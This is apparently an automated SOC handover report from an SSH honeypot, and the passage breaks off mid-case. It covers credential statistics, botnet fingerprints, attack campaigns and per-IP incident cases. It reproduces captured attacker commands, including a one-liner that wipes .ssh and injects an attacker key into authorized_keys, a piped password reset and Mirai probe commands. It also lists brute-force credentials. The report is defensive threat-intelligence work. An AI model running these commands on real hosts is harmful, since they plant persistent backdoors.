# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-11 |
| **Generated At** | 2026-10-11T16:58:33Z |
| **Shift Time** | 16:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **371** |
| Confirmed Threats | **317** |
| False Positives Filtered | **54** (14.6%) |
| Unique Attacker IPs | **241** |
| Countries of Origin | **46** |
| High Severity Cases | **157** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **214** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4427** |
| Unique Credential Pairs | **3763** |
| Unique Usernames | **2001** |
| Unique Passwords | **1687** |
| Successful Auth Pairs | **4070** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 296 |
| `ubuntu` | 191 |
| `345gs5662d34` | 80 |
| `admin` | 52 |
| `support` | 30 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 82 |
| `345gs5662d34` | 80 |
| `123456` | 45 |
| `support` | 34 |
| `12345678` | 20 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 80 |
| `root` | `3245gs5662d34` | 36 |
| `support` | `support` | 30 |
| `root` | `123456` | 11 |
| `admin` | `admin` | 10 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `------fuck------` | `10.0.0.73` | 2026-10-11T00:55:28 |
| `support` | `support` | `176.53.159.196` | 2026-10-11T01:04:07 |
| `payroll` | `payroll` | `10.0.0.73` | 2026-10-11T01:07:43 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-10-11T01:07:46 |
| `payroll` | `3245gs5662d34` | `10.0.0.73` | 2026-10-11T01:07:47 |
| `nav` | `nav` | `10.0.0.73` | 2026-10-11T01:07:55 |
| `nav` | `3245gs5662d34` | `10.0.0.73` | 2026-10-11T01:07:58 |
| `master` | `1234` | `10.0.0.73` | 2026-10-11T01:08:35 |
| `master` | `3245gs5662d34` | `10.0.0.73` | 2026-10-11T01:08:41 |
| `root` | `Welcome2024!` | `10.0.0.73` | 2026-10-11T01:09:00 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-10-11T01:09:01 |
| `root` | `Proxy123` | `10.0.0.73` | 2026-10-11T01:09:23 |
| `root` | `ABCabc@123` | `10.0.0.73` | 2026-10-11T01:13:20 |
| `prashant` | `P@ssw0rd` | `10.0.0.73` | 2026-10-11T01:13:20 |
| `prashant` | `3245gs5662d34` | `10.0.0.73` | 2026-10-11T01:13:26 |
| `itadmin` | `password` | `200.37.103.36` | 2026-10-11T01:13:59 |
| `345gs5662d34` | `345gs5662d34` | `200.37.103.36` | 2026-10-11T01:14:02 |
| `root` | `zaq!@#123` | `10.0.0.73` | 2026-10-11T01:14:09 |
| `root` | `zxc!@#` | `116.55.245.26` | 2026-10-11T01:24:51 |
| `support` | `support` | `10.0.0.73` | 2026-10-11T01:29:11 |
_… 4050 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **371** |
| Sessions with Fingerprint | **28** |
| Unique HASSH Fingerprints | **28** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 127 |
| Go SSH scanner | 61 |
| Paramiko (Python) | 9 |
| PuTTY | 4 |
| Unknown | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 98 | 51 |
| `16443846184e...` | Generic scanner | 11 | 7 |
| `084386fa7ae5...` | Mirai/variant | 9 | 9 |
| `0a07365cc01f...` | Generic scanner | 9 | 6 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 98 | 51 | Mirai/variant |
| `95420f9d932d...` | libssh | 22 | 12 | — |
| `16443846184e...` | Go SSH scanner | 11 | 7 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 9 | 9 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 9 | 6 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 7 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **23** |
| Campaign Clusters | **7** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 82 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 59 | 42 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "ton\nMsoFcSMdEiLM\nMsoFcSMdEiLM"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `120.48.17.39`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.217`, `92.118.39.14`, `195.178.110.232`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **241** |
| Unique ASNs | **117** |
| High-Risk ASNs | **83** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 44 | HIGH |
| `AS396982` | Google LLC | 15 | HIGH |
| `AS4766` | Korea Telecom | 12 | HIGH |
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS6939` | Hurricane Electric LLC | 6 | HIGH |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (155)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0cfc1dcfe93d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-11 01:04 |
| **Last Seen** | 2026-10-11 01:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 01:04:06` | `cowrie.session.connect` |
| `2026-10-11 01:04:06` | `cowrie.client.version` |
| `2026-10-11 01:04:06` | `cowrie.client.kex` |
| `2026-10-11 01:04:07` | `cowrie.login.success` |
| `2026-10-11 01:04:07` | `cowrie.direct-tcpip.request` |
| `2026-10-11 01:04:07` | `cowrie.direct-tcpip.data` |
| `2026-10-11 01:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd78a0041df

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-10-11 01:13 |
| **Last Seen** | 2026-10-11 01:14 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 01:13:59` | `cowrie.session.connect` |
| `2026-10-11 01:13:59` | `cowrie.client.version` |
| `2026-10-11 01:13:59` | `cowrie.client.kex` |
| `2026-10-11 01:13:59` | `cowrie.login.success` |
| `2026-10-11 01:14:00` | `cowrie.session.params` |
| `2026-10-11 01:14:00` | `cowrie.command.input` |
| `2026-10-11 01:14:00` | `cowrie.command.failed` |
| `2026-10-11 01:14:00` | `cowrie.log.closed` |
| `2026-10-11 01:14:01` | `cowrie.session.params` |
| `2026-10-11 01:14:01` | `cowrie.command.input` |
| `2026-10-11 01:14:01` | `cowrie.session.file_download` |
| `2026-10-11 01:14:01` | `cowrie.log.closed` |
| `2026-10-11 01:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ede586d1b63

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-10-11 01:14 |
| **Last Seen** | 2026-10-11 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 01:14:01` | `cowrie.session.connect` |
| `2026-10-11 01:14:01` | `cowrie.client.version` |
| `2026-10-11 01:14:01` | `cowrie.client.kex` |
| `2026-10-11 01:14:02` | `cowrie.login.success` |
| `2026-10-11 01:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f08b0fb876

| Field | Detail |
|---|---|
| **Source IP** | `116.55.245[.]26` |
| **First Seen** | 2026-10-11 01:24 |
| **Last Seen** | 2026-10-11 01:29 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 01:24:49` | `cowrie.session.connect` |
| `2026-10-11 01:24:49` | `cowrie.client.version` |
| `2026-10-11 01:24:49` | `cowrie.client.kex` |
| `2026-10-11 01:24:51` | `cowrie.login.success` |
| `2026-10-11 01:24:52` | `cowrie.session.params` |
| `2026-10-11 01:24:52` | `cowrie.command.input` |
| `2026-10-11 01:24:52` | `cowrie.command.failed` |
| `2026-10-11 01:24:53` | `cowrie.log.closed` |
| `2026-10-11 01:24:54` | `cowrie.session.params` |
| `2026-10-11 01:24:54` | `cowrie.command.input` |
| `2026-10-11 01:24:54` | `cowrie.session.file_download` |
| `2026-10-11 01:24:54` | `cowrie.log.closed` |
| `2026-10-11 01:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.55.245[.]26` to AbuseIPDB if not already reported
- [ ] Block `116.55.245[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-233ea5fd2ebe

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]117` |
| **First Seen** | 2026-10-11 01:32 |
| **Last Seen** | 2026-10-11 01:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 01:32:42` | `cowrie.session.connect` |
| `2026-10-11 01:32:42` | `cowrie.client.version` |
| `2026-10-11 01:32:42` | `cowrie.client.kex` |
| `2026-10-11 01:32:42` | `cowrie.login.success` |
| `2026-10-11 01:32:43` | `cowrie.session.params` |
| `2026-10-11 01:32:43` | `cowrie.command.input` |
| `2026-10-11 01:32:43` | `cowrie.log.closed` |
| `2026-10-11 01:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]117` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff33ca55445

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]61` |
| **First Seen** | 2026-10-11 01:45 |
| **Last Seen** | 2026-10-11 01:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 01:45:37` | `cowrie.session.connect` |
| `2026-10-11 01:45:37` | `cowrie.client.version` |
| `2026-10-11 01:45:37` | `cowrie.client.kex` |
| `2026-10-11 01:45:38` | `cowrie.login.success` |
| `2026-10-11 01:45:38` | `cowrie.session.params` |
| `2026-10-11 01:45:38` | `cowrie.command.input` |
| `2026-10-11 01:45:39` | `cowrie.log.closed` |
| `2026-10-11 01:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e91007705b5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]117` |
| **First Seen** | 2026-10-11 02:00 |
| **Last Seen** | 2026-10-11 02:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:00:01` | `cowrie.session.connect` |
| `2026-10-11 02:00:01` | `cowrie.client.version` |
| `2026-10-11 02:00:01` | `cowrie.client.kex` |
| `2026-10-11 02:00:02` | `cowrie.login.success` |
| `2026-10-11 02:00:02` | `cowrie.session.params` |
| `2026-10-11 02:00:02` | `cowrie.command.input` |
| `2026-10-11 02:00:02` | `cowrie.log.closed` |
| `2026-10-11 02:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]117` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3913c60d48a2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-11 02:26 |
| **Last Seen** | 2026-10-11 02:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:26:56` | `cowrie.session.connect` |
| `2026-10-11 02:26:56` | `cowrie.client.version` |
| `2026-10-11 02:26:56` | `cowrie.client.kex` |
| `2026-10-11 02:26:56` | `cowrie.login.success` |
| `2026-10-11 02:26:56` | `cowrie.direct-tcpip.request` |
| `2026-10-11 02:26:57` | `cowrie.direct-tcpip.data` |
| `2026-10-11 02:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8619d48b2422

| Field | Detail |
|---|---|
| **Source IP** | `104.155.92[.]149` |
| **First Seen** | 2026-10-11 02:35 |
| **Last Seen** | 2026-10-11 02:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:35:52` | `cowrie.session.connect` |
| `2026-10-11 02:35:52` | `cowrie.client.version` |
| `2026-10-11 02:35:52` | `cowrie.client.kex` |
| `2026-10-11 02:35:55` | `cowrie.login.success` |
| `2026-10-11 02:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.92[.]149` to AbuseIPDB if not already reported
- [ ] Block `104.155.92[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2ca74437edb

| Field | Detail |
|---|---|
| **Source IP** | `104.199.98[.]238` |
| **First Seen** | 2026-10-11 02:41 |
| **Last Seen** | 2026-10-11 02:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:41:17` | `cowrie.session.connect` |
| `2026-10-11 02:41:17` | `cowrie.login.success` |
| `2026-10-11 02:41:17` | `cowrie.session.params` |
| `2026-10-11 02:41:17` | `cowrie.command.input` |
| `2026-10-11 02:41:17` | `cowrie.command.input` |
| `2026-10-11 02:41:17` | `cowrie.command.failed` |
| `2026-10-11 02:41:17` | `cowrie.command.input` |
| `2026-10-11 02:41:17` | `cowrie.log.closed` |
| `2026-10-11 02:41:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.98[.]238` to AbuseIPDB if not already reported
- [ ] Block `104.199.98[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ca3ce23305

| Field | Detail |
|---|---|
| **Source IP** | `104.199.98[.]238` |
| **First Seen** | 2026-10-11 02:41 |
| **Last Seen** | 2026-10-11 02:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:41:25` | `cowrie.session.connect` |
| `2026-10-11 02:41:25` | `cowrie.login.success` |
| `2026-10-11 02:41:26` | `cowrie.session.params` |
| `2026-10-11 02:41:26` | `cowrie.command.input` |
| `2026-10-11 02:41:26` | `cowrie.command.failed` |
| `2026-10-11 02:41:38` | `cowrie.log.closed` |
| `2026-10-11 02:41:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.98[.]238` to AbuseIPDB if not already reported
- [ ] Block `104.199.98[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a8fa7d1140d

| Field | Detail |
|---|---|
| **Source IP** | `104.199.98[.]238` |
| **First Seen** | 2026-10-11 02:41 |
| **Last Seen** | 2026-10-11 02:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:41:27` | `cowrie.session.connect` |
| `2026-10-11 02:41:27` | `cowrie.login.success` |
| `2026-10-11 02:41:28` | `cowrie.session.params` |
| `2026-10-11 02:41:28` | `cowrie.command.input` |
| `2026-10-11 02:41:38` | `cowrie.log.closed` |
| `2026-10-11 02:41:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.98[.]238` to AbuseIPDB if not already reported
- [ ] Block `104.199.98[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f1be7041eeb

| Field | Detail |
|---|---|
| **Source IP** | `34.78.68[.]41` |
| **First Seen** | 2026-10-11 02:54 |
| **Last Seen** | 2026-10-11 02:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:54:59` | `cowrie.session.connect` |
| `2026-10-11 02:54:59` | `cowrie.login.success` |
| `2026-10-11 02:54:59` | `cowrie.session.params` |
| `2026-10-11 02:54:59` | `cowrie.command.input` |
| `2026-10-11 02:54:59` | `cowrie.command.input` |
| `2026-10-11 02:54:59` | `cowrie.command.failed` |
| `2026-10-11 02:54:59` | `cowrie.command.input` |
| `2026-10-11 02:54:59` | `cowrie.log.closed` |
| `2026-10-11 02:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.68[.]41` to AbuseIPDB if not already reported
- [ ] Block `34.78.68[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179da3f94f46

| Field | Detail |
|---|---|
| **Source IP** | `34.78.68[.]41` |
| **First Seen** | 2026-10-11 02:55 |
| **Last Seen** | 2026-10-11 02:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:55:12` | `cowrie.session.connect` |
| `2026-10-11 02:55:12` | `cowrie.login.success` |
| `2026-10-11 02:55:13` | `cowrie.session.params` |
| `2026-10-11 02:55:13` | `cowrie.command.input` |
| `2026-10-11 02:55:13` | `cowrie.command.failed` |
| `2026-10-11 02:55:17` | `cowrie.log.closed` |
| `2026-10-11 02:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.68[.]41` to AbuseIPDB if not already reported
- [ ] Block `34.78.68[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d475b32b3848

| Field | Detail |
|---|---|
| **Source IP** | `34.78.68[.]41` |
| **First Seen** | 2026-10-11 02:55 |
| **Last Seen** | 2026-10-11 02:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-11 02:55:14` | `cowrie.session.connect` |
| `2026-10-11 02:55:14` | `cowrie.login.success` |
| `2026-10-11 02:55:15` | `cowrie.session.params` |
| `2026-10-11 02:55:15` | `cowrie.command.input` |
| `2026-10-11 02:55:17` | `cowrie.log.closed` |
| `2026-10-11 02:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.68[.]41` to AbuseIPDB if not already reported
- [ ] Block `34.78.68[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa010ddb2d6

| Field | Detail |
|---|---|
| **Source IP** | `104.143.36[.]100` |
| **First Seen** | 2026-10-11 03:14 |
| **Last Seen** | 2026-10-11 03:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
